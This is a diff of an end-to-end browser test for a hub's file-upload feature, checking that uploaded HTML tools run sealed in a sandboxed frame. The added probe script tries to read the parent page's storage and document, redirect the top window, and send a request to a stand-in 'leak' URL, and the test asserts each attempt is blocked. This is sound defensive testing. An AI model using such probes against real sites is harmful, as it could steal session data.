@@ -36,7 +36,21 @@ const tool = (v) => `<!DOCTYPE html><html><head><meta charset="utf-8"><title>PMO
   function add(k) { n += k; document.getElementById('count').textContent = n;
     document.getElementById('list').innerHTML += '<p class="card" style="color: rgb(255, 0, 0)">row ' + n + '</p>'; }
   function ready() { document.body.setAttribute('data-ready', 'yes'); }
-</script></body></html>`;
+  // what a sealed tool can and cannot do
+  var probe = { origin: String(window.origin) };
+  try { window.parent.localStorage.getItem('x'); probe.storage = 'READ'; } catch (e) { probe.storage = 'blocked'; }
+  try { probe.doc = window.parent.document.title ? 'READ' : 'READ'; } catch (e) { probe.doc = 'blocked'; }
+  try { window.top.location = 'about:blank'; probe.top = 'sent'; } catch (e) { probe.top = 'blocked'; }
+  localStorage.setItem('visits', String(Number(localStorage.getItem('visits') || 0) + 1));
+  probe.visits = localStorage.getItem('visits');
+  document.documentElement.setAttribute('data-probe', JSON.stringify(probe));
+  fetch('https://example.com/leak?d=1').then(function () { document.documentElement.setAttribute('data-leak', 'SENT'); }, function () { document.documentElement.setAttribute('data-leak', 'blocked'); });
+  document.addEventListener('click', function (e) {
+    if (e.target.id !== 'save') return;
+    Dame.save('rows', { n: n, by: Dame.user().username }).then(function (r) { return Dame.list('rows'); })
+      .then(function (rows) { document.getElementById('rows').textContent = String(rows.length); }, function (err) { document.getElementById('rows').textContent = 'ERR ' + err.code; });
+  });
+</script><button id="save">Save</button> <span id="rows">-</span></body></html>`;
 writeFileSync(dir + '/tracker.html', tool('v1'));
 writeFileSync(dir + '/pages/more.html', '<!doctype html><title>More</title><p id="m">More page</p><a href="../index.html">Back</a>');
 
@@ -45,7 +59,7 @@ async function as(user, viewport, pass) {
   const ctx = await browser.newContext({ viewport: viewport || { width: 1100, height: 800 } });
   const page = await ctx.newPage();
   page.csp = 0;
-  page.on('console', (m) => { if (m.type() === 'error') { if (/Content Security Policy/.test(m.text())) page.csp++; else if (!/40[034]|422/.test(m.text())) errors.push(step + ': console ' + m.text()); } });
+  page.on('console', (m) => { if (m.type() === 'error') { if (/Content Security Policy/.test(m.text())) page.csp++; else if (!/40[034]|422|ERR_FAILED|example\.com|sandboxed|Unsafe attempt|Blocked a frame/.test(m.text())) errors.push(step + ': console ' + m.text()); } });
   page.on('pageerror', (e) => errors.push(step + ': pageerror ' + e.message));
   await page.goto(B + '/dame-hub/');
   await page.fill('#si-email', user.indexOf('@') > 0 ? user : user + '@example.com'); await page.fill('#si-pass', pass || 'DemoPass2026'); await page.click('#signin button[type=submit]');
@@ -53,6 +67,19 @@ async function as(user, viewport, pass) {
   return page;
 }
 const shot = (p, n) => p.screenshot({ path: 'dev/test/out/' + n + '.png', fullPage: true });
+async function sealed(page, ready) {   // the sealed frame of an uploaded tile (a srcdoc frame: reached through locators)
+  const fl = page.frameLocator('#up-frame'), html = fl.locator('html');
+  await fl.locator(ready || 'body[data-ready]').waitFor({ state: 'attached' });
+  return {
+    click: (sel) => fl.locator(sel).first().click(),
+    textContent: (sel) => fl.locator(sel).first().textContent(),
+    getAttribute: (sel, name) => fl.locator(sel).first().getAttribute(name),
+    evaluate: (fn) => html.evaluate(fn),
+    waitForSelector: (sel) => fl.locator(sel).first().waitFor({ state: 'attached' }),
+    waitForTimeout: (ms) => page.waitForTimeout(ms),
+    waitForFunction: async (fn) => { for (let i = 0; i < 100; i++) { if (await html.evaluate(fn)) return; await page.waitForTimeout(100); } throw new Error('waitForFunction in the sealed frame timed out'); }
+  };
+}
 async function confirmSheet(page, label) { await page.locator('.sheet button', { hasText: label }).click(); }
 
 try {
@@ -81,29 +108,43 @@ try {
   expect((await admin.textContent('#preview-text')).includes('Version'), 'preview recorded');
   await shot(admin, 'upload-preview');
 
-  log('the preview, as the manager');
+  log('the preview, as the manager, in the sealed frame');
   await admin.goto(B + '/dame-hub/pmo/_next/');
   await admin.waitForSelector('#up-bar');
   expect(await admin.locator('#up-bar .up-badge').textContent() === 'Preview, not live', 'bar says preview');
-  expect(await admin.evaluate(() => !document.documentElement.hasAttribute('data-up-locked')), 'page unlocked');
-  expect(await admin.evaluate(() => getComputedStyle(document.getElementById('h')).color) === 'rgb(10, 123, 194)', 'style="" applied under the CSP');
-  expect(await admin.evaluate(() => getComputedStyle(document.getElementById('count')).fontWeight) === '700', 'inline <style> works as a file');
-  expect(await admin.evaluate(() => window.Lib && window.Lib.v === 1), 'CDN library copied in and loaded');
-  expect(await admin.evaluate(() => document.body.getAttribute('data-ready')) === 'yes', 'body onload ran');
-  await admin.click('#add'); await admin.click('#add');
-  expect(await admin.textContent('#count') === '2', 'onclick handlers run');
-  await admin.waitForTimeout(100);
-  expect(await admin.evaluate(() => getComputedStyle(document.querySelector('#list p')).color) === 'rgb(255, 0, 0)', 'style="" in HTML added by script applied');
-  expect(admin.url().endsWith('/_next/'), 'return false kept the page');
-  await admin.click('#more'); await admin.waitForSelector('#m');
-  expect(await admin.textContent('#m') === 'More page', 'second page in a folder opens');
-  console.log('  (' + admin.csp + ' CSP reports for style attributes, re-applied by uploaded.js)');
+  let f = await sealed(admin);
+  expect(await admin.getAttribute('#up-frame', 'sandbox') === 'allow-scripts allow-forms allow-modals allow-downloads', 'frame is sandboxed, no same-origin, no popups, no top navigation');
+  const probe = JSON.parse(await f.getAttribute('html', 'data-probe'));
+  expect(probe.origin === 'null', 'the tool has no origin of its own');
+  expect(probe.storage === 'blocked' && probe.doc === 'blocked', 'it cannot read the site\'s storage (the session) or the page around it');
+  expect(probe.top !== 'sent' && admin.url().includes('/pmo/_next/'), 'it cannot move the page away');
+  await f.waitForSelector('html[data-leak]');
+  expect(await f.getAttribute('html', 'data-leak') === 'blocked', 'it cannot call an outside address');
+  expect(await f.evaluate(() => getComputedStyle(document.getElementById('h')).color) === 'rgb(10, 123, 194)', 'style="" applied under the policy');
+  expect(await f.evaluate(() => getComputedStyle(document.getElementById('count')).fontWeight) === '700', 'inline <style> works as a file');
+  expect(await f.evaluate(() => window.Lib && window.Lib.v === 1), 'CDN library copied in and loaded');
+  await f.click('#add'); await f.click('#add');
+  expect(await f.textContent('#count') === '2', 'onclick handlers run');
+  await f.waitForTimeout(100);
+  expect(await f.evaluate(() => getComputedStyle(document.querySelector('#list p')).color) === 'rgb(255, 0, 0)', 'style="" in HTML added by script applied');
+  await f.click('#save'); await f.waitForFunction(() => document.getElementById('rows').textContent !== '-');
+  expect(await f.textContent('#rows') === '1', 'Dame.save and Dame.list work (preview data)');
+  await admin.waitForTimeout(700);   // the stand-in saves 400 ms after a change
+  await f.click('#more');
+  await admin.waitForFunction(() => location.hash === '#pages/more.html');
+  const f2 = await sealed(admin, '#m');
+  expect(await f2.textContent('#m') === 'More page', 'second page in a folder opens through the shell');
+  await f2.click('a'); await admin.waitForFunction(() => location.hash === '' || location.hash === '#');
+  f = await sealed(admin);
+  expect(Number(JSON.parse(await f.getAttribute('html', 'data-probe')).visits) === Number(probe.visits) + 1, 'localStorage stand-in is kept by the site between page loads');
+  const raw = await admin.request.get(B + '/dame-hub/pmo/_next/index.html.txt');
+  expect(raw.headers()['content-type'].startsWith('text/plain') && (await raw.text()).includes('PMO tracker'), 'the tool page itself is served as text, never as HTML');
 
   log('the preview, as a reader');
   await viewer.goto(B + '/dame-hub/pmo/_next/');
   await viewer.waitForSelector('#up-gate');
   expect((await viewer.textContent('#up-gate')).includes('only for the tile\'s managers'), 'reader cannot open the preview');
-  expect(await viewer.evaluate(() => getComputedStyle(document.getElementById('h')).visibility) === 'hidden', 'tool stays hidden');
+  expect(await viewer.locator('#up-frame').count() === 0, 'no frame is made');
 
   log('make live');
   await admin.goto(B + '/dame-hub/upload.html?tile=pmo');
@@ -114,7 +155,14 @@ try {
   await viewer.goto(B + '/dame-hub/dashboard.html'); await viewer.waitForSelector('#tiles a.tile');
   expect(await viewer.locator('#tiles .tile', { hasText: 'PMO' }).getAttribute('href') === '/dame-hub/pmo/', 'reader: tile opens /dame-hub/pmo/');
   await viewer.goto(B + '/dame-hub/pmo/'); await viewer.waitForSelector('#up-bar');
-  expect((await viewer.textContent('#h')).includes('v1'), 'reader sees v1');
+  let vf = await sealed(viewer);
+  expect((await vf.textContent('#h')).includes('v1'), 'reader sees v1');
+  await vf.click('#save'); await vf.waitForFunction(() => document.getElementById('rows').textContent !== '-');
+  expect(await vf.textContent('#rows') === 'ERR NO_RIGHT', 'a reader cannot write shared data');
+  await admin.goto(B + '/dame-hub/pmo/'); f = await sealed(admin);
+  await f.click('#save'); await f.waitForFunction(() => document.getElementById('rows').textContent !== '-');
+  expect(await f.textContent('#rows') === '1', 'live data is separate from preview data; the manager saves');
+  await admin.goto(B + '/dame-hub/upload.html?tile=pmo'); await admin.waitForSelector('#history table');
   expect(await viewer.locator('#up-bar .up-link').count() === 0, 'no Files link for a reader');
   await shot(viewer, 'upload-live-viewer');
   const none = await as('demo_none');
@@ -130,13 +178,13 @@ try {
   await admin.click('#send'); await admin.waitForSelector('#preview-card:not([hidden])', { timeout: 15000 });
   await admin.click('#make-live'); await confirmSheet(admin, 'Make live');
   await admin.waitForSelector('#preview-card[hidden]', { state: 'attached', timeout: 15000 });
-  await viewer.goto(B + '/dame-hub/pmo/'); await viewer.waitForSelector('#up-bar');
-  expect((await viewer.textContent('#h')).includes('v2'), 'reader sees v2');
+  await viewer.goto(B + '/dame-hub/pmo/'); vf = await sealed(viewer);
+  expect((await vf.textContent('#h')).includes('v2'), 'reader sees v2');
   await admin.waitForSelector('#history button:has-text("Restore")');
   await admin.locator('#history button', { hasText: 'Restore' }).first().click(); await confirmSheet(admin, 'Restore');
   await admin.waitForSelector('.toast.success:has-text("live again")', { timeout: 15000 });
-  await viewer.goto(B + '/dame-hub/pmo/'); await viewer.waitForSelector('#up-bar');
-  expect((await viewer.textContent('#h')).includes('v1'), 'restored: reader sees v1 again');
+  await viewer.goto(B + '/dame-hub/pmo/'); vf = await sealed(viewer);
+  expect((await vf.textContent('#h')).includes('v1'), 'restored: reader sees v1 again');
   expect(psql(`select string_agg(status, ',' order by id) from core.tile_releases where tile_id = 'pmo'`) === 'live,old', 'releases: v1 live again, v2 old');
   console.log('  releases: ' + psql(`select string_agg(id || ' ' || status, ', ' order by id) from core.tile_releases where tile_id = 'pmo'`));
   expect(psql(`select count(*) from core.audit where tile_id = 'pmo' and action like 'upload%'`) === '5', 'five upload actions in the audit (2 previews, 2 live, 1 restore)');
@@ -152,7 +200,7 @@ try {
   await shot(phone, 'upload-390');
   const scroll = await phone.evaluate(() => document.documentElement.scrollWidth);
   expect(scroll <= 392, 'Files page fits 390 px (' + scroll + ')');
-  await phone.goto(B + '/dame-hub/pmo/'); await phone.waitForSelector('#up-bar');
+  await phone.goto(B + '/dame-hub/pmo/'); await sealed(phone);
   await shot(phone, 'upload-tile-390');
 
   log('super user: new tile with next steps, delete a tile');
@@ -189,7 +237,7 @@ try {
   errors.push(step + ': ' + e.message);
 } finally {
   await browser.close();
-  rmSync(new URL('../../pmo', import.meta.url), { recursive: true, force: true });
+  if (!process.env.KEEP) rmSync(new URL('../../pmo', import.meta.url), { recursive: true, force: true });
 }
 if (errors.length) { console.log('\n' + errors.length + ' problem(s):\n' + errors.join('\n')); process.exit(1); }
 console.log('\nUPLOAD E2E PASSED');
